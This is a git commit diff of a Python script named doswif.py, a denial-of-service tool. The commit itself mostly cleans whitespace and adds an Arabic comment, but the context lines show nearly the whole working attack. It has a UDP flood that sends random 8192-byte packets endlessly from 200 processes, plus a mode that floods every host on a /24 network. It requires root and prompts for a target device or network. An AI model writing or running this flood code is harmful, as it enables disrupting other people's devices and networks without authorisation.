ffb00662d8dc8634e80f679719d77ca5039af908
BO YARB <zomlong9@gmail.com>
2025-02-08 21:43:14 +0300

    Update doswif.py

--- doswif.py
+++ doswif.py
@@ -7,16 +7,16 @@ import sys
 import signal
 
 def handle_ctrl_z(signal, frame):
-    print("\033[1;97mStopped\033[0m")  
-    sys.exit(0)  
+    print("\n\033[1;97mStopped\033[0m")  # إضافة \n لجعل الرسالة تظهر في سطر جديد
+    sys.exit(0)
 
 def handle_ctrl_c(signal, frame):
-    sys.exit(0)  
+    sys.exit(0)
 
 signal.signal(signal.SIGTSTP, handle_ctrl_z)
 signal.signal(signal.SIGINT, handle_ctrl_c)
 
-os.system('clear')  
+os.system('clear')
 
 if os.geteuid() != 0:
     print("\033[1;31mRun the program with root privileges!\033[0m")
@@ -24,12 +24,12 @@ if os.geteuid() != 0:
 
 v = " \033[1;31m "
 print(v + """
-888888ba   .88888.  .d88888b  dP   dP   dP dP  88888888b 
-88    `8b d8'   `8b 88.    "' 88   88   88 88  88        
-88     88 88     88 `Y88888b. 88  .8P  .8P 88 a88aaaa    
-88     88 88     88       `8b 88  d8'  d8' 88  88        
-88    .8P Y8.   .8P d8'   .8P 88.d8P8.d8P  88  88        
-8888888P   `8888P'   Y88888P  8888' Y88'   dP  dP        
+888888ba   .88888.  .d88888b  dP   dP   dP dP  88888888b
+88    `8b d8'   `8b 88.    "' 88   88   88 88  88
+88     88 88     88 `Y88888b. 88  .8P  .8P 88 a88aaaa
+88     88 88     88       `8b 88  d8'  d8' 88  88
+88    .8P Y8.   .8P d8'   .8P 88.d8P8.d8P  88  88
+8888888P   `8888P'   Y88888P 8888' Y88'   dP  dP
 ooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
 """)
 
@@ -43,28 +43,28 @@ print("""
 
 def udp_flood(target_ip, target_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(8192)  
+    data = random._urandom(8192)
     count = 0
-    while True:  
-        client.sendto(data, (target_ip, target_port))  
+    while True:
+        client.sendto(data, (target_ip, target_port))
         count += 1
-        if count % 100 == 0:  
+        if count % 100 == 0:
             print(f"Sent {count} packets to {target_ip}:{target_port}")
 
 def start_attack(target_ip, target_port):
     processes = []
-    for i in range(200):  
+    for i in range(200):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port))
         process.daemon = True
         processes.append(process)
         process.start()
 
     for process in processes:
-        process.join()  
+        process.join()
 
 def attack_network(network_ip, target_port):
     net = ipaddress.IPv4Network(network_ip, strict=False)
-    for ip in net.hosts():  
+    for ip in net.hosts():
         print(f"Attacking {ip}...")
         start_attack(str(ip), target_port)
 
@@ -91,7 +91,7 @@ if __name__ == "__main__":
         target_ip = input("\033[0;36mEnter the target device IP address: \033[0m").strip()
         target_port = input("\033[0;36mEnter the target port (usually 80 or 443): \033[0m").strip()
 
-        
+
         if not target_ip:
             print("\033[1;31mError: You must enter the mobile device IP address.\033[0m")
         elif not target_port:
@@ -111,12 +111,12 @@ if __name__ == "__main__":
         network_ip = input("\033[0;36mEnter the network address (e.g., 192.168.0.1/24): \033[0m").strip()
         target_port = input("\033[0;36mEnter the target port (usually 80 or 443): \033[0m").strip()
 
-        
+
         if not network_ip:
             print("\033[1;31mError: You must enter the network IP address.\033[0m")
         elif '/24' not in network_ip:
             print("\033[1;31mError: You must enter a network IP with /24 (e.g., 192.168.0.1/24).\033[0m")
-        elif not contains_three_dots(network_ip.split('/')[0]):  
+        elif not contains_three_dots(network_ip.split('/')[0]):
             print("\033[1;31mError: The IP address in the network must contain exactly 3 dots (e.g., 192.168.0.1).\033[0m")
         elif not target_port:
             print("\033[1;31mError: You must enter the port.\033[0m")
